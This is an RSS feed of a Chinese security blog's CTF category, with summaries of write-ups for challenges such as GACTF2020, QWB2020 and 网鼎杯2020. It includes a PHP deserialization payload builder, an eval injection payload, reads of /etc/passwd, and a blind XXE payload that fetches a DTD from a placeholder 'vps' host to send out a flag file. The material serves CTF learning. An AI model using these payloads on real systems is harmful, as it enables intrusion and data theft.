<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>CTF on ch3n9w の 超元域</title>
    <link>http://ch3n9w.cpolar.cn/categories/ctf/</link>
    <description>Recent content in CTF on ch3n9w の 超元域</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Fri, 15 Mar 2024 07:34:46 +0000</lastBuildDate>
    <atom:link href="http://ch3n9w.cpolar.cn/categories/ctf/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>k8s lan party</title>
      <link>http://ch3n9w.cpolar.cn/posts/ctf-k8s-lan-party/</link>
      <pubDate>Fri, 15 Mar 2024 07:34:46 +0000</pubDate>
      <guid>http://ch3n9w.cpolar.cn/posts/ctf-k8s-lan-party/</guid>
      <description>&lt;p&gt;Long time no CTF~~&lt;/p&gt;</description>
    </item>
    <item>
      <title>pwnable尝试</title>
      <link>http://ch3n9w.cpolar.cn/posts/sec-pwnable/</link>
      <pubDate>Thu, 27 Jan 2022 17:48:33 +0000</pubDate>
      <guid>http://ch3n9w.cpolar.cn/posts/sec-pwnable/</guid>
      <description>&lt;p&gt;尝试学pwn,放弃学pwn&lt;/p&gt;</description>
    </item>
    <item>
      <title>GACTF2020</title>
      <link>http://ch3n9w.cpolar.cn/posts/ctf-gactf2020/</link>
      <pubDate>Sat, 29 Aug 2020 15:49:36 +0000</pubDate>
      <guid>http://ch3n9w.cpolar.cn/posts/ctf-gactf2020/</guid>
      <description>&lt;h2 id=&#34;simpleflask&#34;&gt;simpleflask&lt;/h2&gt;
&lt;p&gt;和以往的flask不一样的地方在于, 这里是经过更新后的flask, 计算pin码的方式已经和以前不一样了, 参考 &lt;a href=&#34;https://www.chainnews.com/articles/898433701852.htm&#34;&gt;https://www.chainnews.com/articles/898433701852.htm&lt;/a&gt;, 不过问题不大,就把machine-id拼接在docker那一串东西的前面就可以了, 需要注意的是每十分钟重启时候的机器mac地址是会变化的.&lt;/p&gt;</description>
    </item>
    <item>
      <title>qwb2020web复现</title>
      <link>http://ch3n9w.cpolar.cn/posts/ctf-qwb2020-web-1/</link>
      <pubDate>Thu, 27 Aug 2020 20:48:12 +0000</pubDate>
      <guid>http://ch3n9w.cpolar.cn/posts/ctf-qwb2020-web-1/</guid>
      <description>half_infiltration 开局的页面如下
&amp;lt;?php highlight_file(__FILE__); $flag=file_get_contents(&amp;#39;ssrf.php&amp;#39;); class Pass { function read() { ob_start(); global $result; print $result; } } class User { public $age,$sex,$num; function __destruct() { $student = $this-&amp;gt;age; $boy = $this-&amp;gt;sex; $a = $this-&amp;gt;num; $student-&amp;gt;$boy(); if(!(is_string($a)) ||!(is_string($boy)) || !(is_object($student))) { ob_end_clean(); exit(); } global $$a; $result=$GLOBALS[&amp;#39;flag&amp;#39;]; ob_end_clean(); } } if (isset($_GET[&amp;#39;x&amp;#39;])) { unserialize($_GET[&amp;#39;x&amp;#39;])-&amp;gt;get_it(); } 思路是进行两次反序列化, 第一次将$_GLOBALS[&amp;lsquo;flag&amp;rsquo;]赋值给全局变量$result, 第二次反序列化是让程序在ob_end_clean()执行之前报错退出. ob_start会打开输出缓冲
启用输出缓冲会导致PHP开始存储你输出的脚本而不是立即将它们发送到客户端。当脚本结束或者你调用了ob_flush()函数，PHP才会将内容发送到客户端。
ob_end_clean会将输出缓冲的内容进行一个清空, 那么如果要看到$result的内容的话, 我们就需要在ob_end_clean之前退出程序. 通过将$a赋值为this可以做到让程序报错退出.
&amp;lt;?php class Pass{ function read(){ // ob_start(); global $result; print $result; } } class User{ public $age, $sex, $num; function __construct($a, $b, $c) { $this-&amp;gt;age = $a; $this-&amp;gt;sex = $b; $this-&amp;gt;num = $c; } } echo urlencode(serialize([ new User(new Pass(), &amp;#34;read&amp;#34;, &amp;#34;result&amp;#34;), new User(new Pass(), &amp;#34;read&amp;#34;, &amp;#34;this&amp;#34;) ])); ?</description>
    </item>
    <item>
      <title>ciscn2020_online</title>
      <link>http://ch3n9w.cpolar.cn/posts/ctf-ciscn2020-online/</link>
      <pubDate>Thu, 20 Aug 2020 13:16:50 +0000</pubDate>
      <guid>http://ch3n9w.cpolar.cn/posts/ctf-ciscn2020-online/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;web越來越没有牌面了&amp;hellip;国赛果然是pwn和misc的天下&lt;/p&gt;
&lt;/blockquote&gt;</description>
    </item>
    <item>
      <title>网鼎杯2020 web</title>
      <link>http://ch3n9w.cpolar.cn/posts/ctf-%E7%BD%91%E9%BC%8E%E6%9D%AF2020/</link>
      <pubDate>Mon, 11 May 2020 16:11:31 +0000</pubDate>
      <guid>http://ch3n9w.cpolar.cn/posts/ctf-%E7%BD%91%E9%BC%8E%E6%9D%AF2020/</guid>
      <description>filejava 提供了文件上传和下载的功能, 在下载功能那里我们可以任意文件读取, 通过把文件名换成文件夹名字可以在报错中爆出绝对路径, 如图:
绝对路径
/usr/local/tomcat/webapps/ROOT/WEB-INF/upload/0/10/ 读文件/etc/passwd
读日志文件 logs/catalina.out
​ 发现有一个war包,下载下来进行源码审计, 发现一处突兀的地方
if (filename.startsWith(&amp;#34;excel-&amp;#34;) &amp;amp;&amp;amp; &amp;#34;xlsx&amp;#34;.equals(fileExtName)) try { Workbook wb1 = WorkbookFactory.create(in); Sheet sheet = wb1.getSheetAt(0); System.out.println(sheet.getFirstRowNum()); } catch (InvalidFormatException e) { System.err.println(&amp;#34;poi-ooxml-3.10 has something wrong&amp;#34;); e.printStackTrace(); } 这里会对exce开头而且后缀名为xlsx的文件进行一个解析, 考虑一下使用xlsx来进行blind xxe, 具体可以参考 https://www.jishuwen.com/d/2inW/zh-hk
新建一个xlsx文档, 解压, 修改Content_Types.xml的内容为
&amp;lt;?xml version=&amp;#34;1.0&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE r [ &amp;lt;!ENTITY % data3 SYSTEM &amp;#34;file:///flag&amp;#34;&amp;gt; &amp;lt;!ENTITY % sp SYSTEM &amp;#34;http://vps/ext.dtd&amp;#34;&amp;gt; %sp; %param3; %exfil; ]&amp;gt; 在vps上的web目录下面放置一个ext.dtd, 内容如下:
&amp;lt;!ENTITY % param3 &amp;#34;&amp;lt;!</description>
    </item>
    <item>
      <title>padding_oracle 和 cbc字节反转</title>
      <link>http://ch3n9w.cpolar.cn/posts/sec-padding-oracle-and-cbc-attack/</link>
      <pubDate>Mon, 03 Feb 2020 16:42:20 +0000</pubDate>
      <guid>http://ch3n9w.cpolar.cn/posts/sec-padding-oracle-and-cbc-attack/</guid>
      <description>&lt;p&gt;padding oracle 原理: &lt;a href=&#34;https://www.freebuf.com/articles/database/150606.html&#34;&gt;https://www.freebuf.com/articles/database/150606.html&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>java_web题目复现记录</title>
      <link>http://ch3n9w.cpolar.cn/posts/sec-java-web/</link>
      <pubDate>Fri, 03 Jan 2020 10:57:44 +0000</pubDate>
      <guid>http://ch3n9w.cpolar.cn/posts/sec-java-web/</guid>
      <description>&lt;p&gt;开一个新坑~~&lt;/p&gt;</description>
    </item>
    <item>
      <title>LD_PRELOAD劫持类型题目</title>
      <link>http://ch3n9w.cpolar.cn/posts/sec-ld-preload%E5%8A%AB%E6%8C%81%E7%B1%BB%E5%9E%8B%E9%A2%98%E7%9B%AE/</link>
      <pubDate>Thu, 26 Dec 2019 16:37:19 +0000</pubDate>
      <guid>http://ch3n9w.cpolar.cn/posts/sec-ld-preload%E5%8A%AB%E6%8C%81%E7%B1%BB%E5%9E%8B%E9%A2%98%E7%9B%AE/</guid>
      <description>&lt;p&gt;贴几个参考链接&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/wfzWebSecuity/p/11213732.html&#34;&gt;https://www.cnblogs.com/wfzWebSecuity/p/11213732.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD&#34;&gt;https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>copperstudy-record</title>
      <link>http://ch3n9w.cpolar.cn/posts/ctf-qwb-copperstudy-record/</link>
      <pubDate>Thu, 19 Dec 2019 20:51:05 +0000</pubDate>
      <guid>http://ch3n9w.cpolar.cn/posts/ctf-qwb-copperstudy-record/</guid>
      <description>&lt;h2 id=&#34;强网杯-2019-copperstudy&#34;&gt;强网杯 2019 copperstudy&lt;/h2&gt;
&lt;p&gt;拖拖拉拉终于把这题复现了&amp;hellip;&lt;/p&gt;
&lt;p&gt;开局计算哈希, 爆破爆破&lt;/p&gt;</description>
    </item>
    <item>
      <title>RoarCTF 2019复现</title>
      <link>http://ch3n9w.cpolar.cn/posts/ctf-roarctfwp/</link>
      <pubDate>Tue, 22 Oct 2019 08:32:09 +0000</pubDate>
      <guid>http://ch3n9w.cpolar.cn/posts/ctf-roarctfwp/</guid>
      <description>web online_proxy 特征: 第一次登录后源代码内容有如下:
换一个X-Forwarded-For 后会发现currentip是根据xff判别的
那么有理由认为上一个ip被存储进了数据库中,并在每次检测到访问ip和上一个ip不同的时候就会改变数据库. 源码这里也写到了
$result = query(&amp;#34;select current_ip, last_ip from ip_log where uuid = &amp;#39;&amp;#34;.addslashes($uuid).&amp;#34;&amp;#39;&amp;#34;); if(count($result) &amp;gt; 0) { if($ip !== $result[0][&amp;#39;current_ip&amp;#39;]) { $last_ip = $result[0][&amp;#39;current_ip&amp;#39;]; query(&amp;#34;delete from ip_log where uuid=&amp;#39;&amp;#34;.addslashes($uuid).&amp;#34;&amp;#39;&amp;#34;); } else { $last_ip = $result[0][&amp;#39;last_ip&amp;#39;]; } } query(&amp;#34;insert into ip_log values (&amp;#39;&amp;#34;.addslashes($uuid).&amp;#34;&amp;#39;, &amp;#39;&amp;#34;.addslashes($ip).&amp;#34;&amp;#39;, &amp;#39;$last_ip&amp;#39;);&amp;#34;); die(&amp;#34;\n&amp;lt;!-- Debug Info: \n Duration: $time s \n Current Ip: $ip &amp;#34;.($last_ip !== &amp;#34;&amp;#34; ? &amp;#34;\nLast Ip: &amp;#34;.$last_ip : &amp;#34;&amp;#34;).&amp;#34; --&amp;gt;&amp;#34;); 解法:</description>
    </item>
    <item>
      <title>bytectf2019</title>
      <link>http://ch3n9w.cpolar.cn/posts/ctf-bytectf2019/</link>
      <pubDate>Mon, 09 Sep 2019 08:18:25 +0000</pubDate>
      <guid>http://ch3n9w.cpolar.cn/posts/ctf-bytectf2019/</guid>
      <description>boring code source code
&amp;lt;?php function is_valid_url($url) { if (filter_var($url, FILTER_VALIDATE_URL)) { if (preg_match(&amp;#39;/data:\/\//i&amp;#39;, $url)) { return false; } return true; } return false; } if (isset($_POST[&amp;#39;url&amp;#39;])){ $url = $_POST[&amp;#39;url&amp;#39;]; if (is_valid_url($url)) { $r = parse_url($url); if (preg_match(&amp;#39;/baidu\.com$/&amp;#39;, $r[&amp;#39;host&amp;#39;])) { $code = file_get_contents($url); if (&amp;#39;;&amp;#39; === preg_replace(&amp;#39;/[a-z]+\((?R)?\)/&amp;#39;, NULL, $code)) { if (preg_match(&amp;#39;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&amp;#39;, $code)) { echo &amp;#39;bye~&amp;#39;; } else { eval($code); } } } else { echo &amp;#34;error: host not allowed&amp;#34;; } } else { echo &amp;#34;error: invalid url&amp;#34;; } }else{ highlight_file(__FILE__); } 思路: 注册一个xxxxbaidu.</description>
    </item>
    <item>
      <title>Google_Game</title>
      <link>http://ch3n9w.cpolar.cn/posts/ctf-google-game/</link>
      <pubDate>Wed, 12 Jun 2019 19:41:56 +0000</pubDate>
      <guid>http://ch3n9w.cpolar.cn/posts/ctf-google-game/</guid>
      <description>&lt;h1 id=&#34;google-xss-game&#34;&gt;Google Xss game&lt;/h1&gt;</description>
    </item>
    <item>
      <title>2019 DDCTF web</title>
      <link>http://ch3n9w.cpolar.cn/posts/ctf-2019-ddctf-web/</link>
      <pubDate>Sat, 11 May 2019 13:58:05 +0000</pubDate>
      <guid>http://ch3n9w.cpolar.cn/posts/ctf-2019-ddctf-web/</guid>
      <description>考试周结束，有时间来复现了。。。然鹅好像有题目崩了，java又没学过。。。只能复现一部分了。
web 签到题 点击，扫描，发现除了index.php 之外其他都需要登陆，抓包发现有发送Auth.php请求，其中有didictf_username字段，尝试添加成为didictf_username: admin。成功登陆。
然后在返回包中显示出了一个php文件，尝试访问看到了Session.php的源代码如下：
&amp;lt;?php Class Application { var $path = &amp;#39;&amp;#39;; public function response($data, $errMsg = &amp;#39;success&amp;#39;) { $ret = [&amp;#39;errMsg&amp;#39; =&amp;gt; $errMsg, &amp;#39;data&amp;#39; =&amp;gt; $data]; $ret = json_encode($ret); header(&amp;#39;Content-type: application/json&amp;#39;); echo $ret; } public function auth() { $DIDICTF_ADMIN = &amp;#39;admin&amp;#39;; if(!empty($_SERVER[&amp;#39;HTTP_DIDICTF_USERNAME&amp;#39;]) &amp;amp;&amp;amp; $_SERVER[&amp;#39;HTTP_DIDICTF_USERNAME&amp;#39;] == $DIDICTF_ADMIN) { $this-&amp;gt;response(&amp;#39;您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php&amp;#39;); return TRUE; }else{ $this-&amp;gt;response(&amp;#39;抱歉，您没有登陆权限，请获取权限后访问-----&amp;#39;,&amp;#39;error&amp;#39;); exit(); } } private function sanitizepath($path) { $path = trim($path);//去掉空格 $path=str_replace(&amp;#39;../&amp;#39;,&amp;#39;&amp;#39;,$path);//过滤第一 $path=str_replace(&amp;#39;..\\&amp;#39;,&amp;#39;&amp;#39;,$path);//过滤第二 return $path; }// public function __destruct() { if(empty($this-&amp;gt;path)) { exit(); }else{ $path = $this-&amp;gt;sanitizepath($this-&amp;gt;path);// .</description>
    </item>
    <item>
      <title>流量分析</title>
      <link>http://ch3n9w.cpolar.cn/posts/sec-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</link>
      <pubDate>Mon, 22 Apr 2019 04:16:47 +0000</pubDate>
      <guid>http://ch3n9w.cpolar.cn/posts/sec-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;bugku 中的部分misc题目&lt;/p&gt;
&lt;/blockquote&gt;</description>
    </item>
    <item>
      <title>密码学题目</title>
      <link>http://ch3n9w.cpolar.cn/posts/ctf-crypto/</link>
      <pubDate>Mon, 22 Apr 2019 04:14:20 +0000</pubDate>
      <guid>http://ch3n9w.cpolar.cn/posts/ctf-crypto/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;记录密码学刷过的题目&lt;/p&gt;
&lt;/blockquote&gt;</description>
    </item>
    <item>
      <title>bugku writeup</title>
      <link>http://ch3n9w.cpolar.cn/posts/ctf-bugku-writeup/</link>
      <pubDate>Mon, 22 Apr 2019 04:13:30 +0000</pubDate>
      <guid>http://ch3n9w.cpolar.cn/posts/ctf-bugku-writeup/</guid>
      <description>纪念那段岁月
web3 网站里面循环弹出提示框，用chrome的开发者工具打开一片空白， 用ctrl+u查看源代码，发现一串
&amp;lt;!--&amp;amp;#75;&amp;amp;#69;&amp;amp;#89;&amp;amp;#123;&amp;amp;#74;&amp;amp;#50;&amp;amp;#115; &amp;amp;#97;&amp;amp;#52;&amp;amp;#50;&amp;amp;#97;&amp;amp;#104;&amp;amp;#74;&amp;amp;#75;&amp;amp;#45; &amp;amp;#72;&amp;amp;#83;&amp;amp;#49;&amp;amp;#49;&amp;amp;#73;&amp;amp;#73;&amp;amp;#73;&amp;amp;#125;--&amp;gt; 这是unicode，转码即可
你必须让他停下来！ 查看源代码竟然直接有flag了，网上的解法是抓包
本地包含 解法:利用hellow构造payload $_REQUEST：默认情况下包含了 $_GET，$_POST 和 $_COOKIE 的数组。 var_dump():此函数显示有关包含其类型和值的一个或多个表达式的结构化信息。 递归地探索数组和对象，其中值缩进以显示结构。在这题里面只是显示变量的类型，对 eval并无影响，对于eval来说，和eval（$a）是一样的。
payload：/index.php?hello = show_source(&amp;lsquo;flag.php&amp;rsquo;) 网上的payload：/index.php?hello=1);show_source(&amp;lsquo;flag.php&amp;rsquo;);var_dump(
域名解析 编辑etc/hosts添加一条123.206.87.240	flag.bugku.com， 在浏览器中打开flag.bugku.com即可得到flag。
反思：host请求头是http1.1添加的东西， 添加域名解析之后直接访问123.206.87.240却显示403，也就是说在https下主机名必不可少。
添加host之前访问ip地址结果显示错误400（缺少host） 添加host之后访问ip地址结果显示错误403（读取访问被禁）
你必须让他停下 使用burpsuite的repeater功能进行抓包操作， 通过多次点击go，最终发现在原先是“flag is here”的位置出现了flag
变量1 函数知识： isset（）判断是否有输入 pre_match是正则表达式，引号中的内容都以/^开头，以$/结尾，\w+的意思是0~9 a~z A~Z， 输入的内容被限定了，所以不能输入代码
输入arg=GLOBALS，从代码中可知会给GLOBALS再套上一个$，就输出了flag
Web5 查看源代码，发现jother编码，打开控制台输入就行了
头等舱 打开网页显示什么都没有，查看源代码也什么都没有，打开控制台重新加载看头文件，什么也没有， 点击显示头文件源代码，显示flag（注释形式）
网站被黑 扫描端口
发现登陆界面
然后用burpsuite的intruder功能破解
管理员系统 实在没有头绪，上网查说这是X-Forwarded-For:简称XFF头，它代表客户端， 也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项。 也就是第一次发送的时候会记录本主机的ip，之后每次经过一个代理， 都会在尾部添加一个代理的ip， X-Forwarded-For可以显示完整的传输路径和恶意攻击来源但是X-Forward-For可以被伪造。题目中说联系本地管理员，那就设置X-Forwarded-For为代表本地访问的127.0.0.1。 同时查看网页源代码发现，有一串注释，查到说是base64编码， 特征是结尾以一个或者两个=结束，解码后得到密码，输入后使用burpsuite进行拦截， 添加X-Forwarded-For：127。0.0.1后发送，得到了flag
参考资料：ctf中常见的编码格式： https://www.cnblogs.com/gwind/p/7997922.html
web4 查看源代码，发现一串url编码的东西， Eval函数会将里面的内容作为代码执行，unescape将其解码。要解码：</description>
    </item>
  </channel>
</rss>
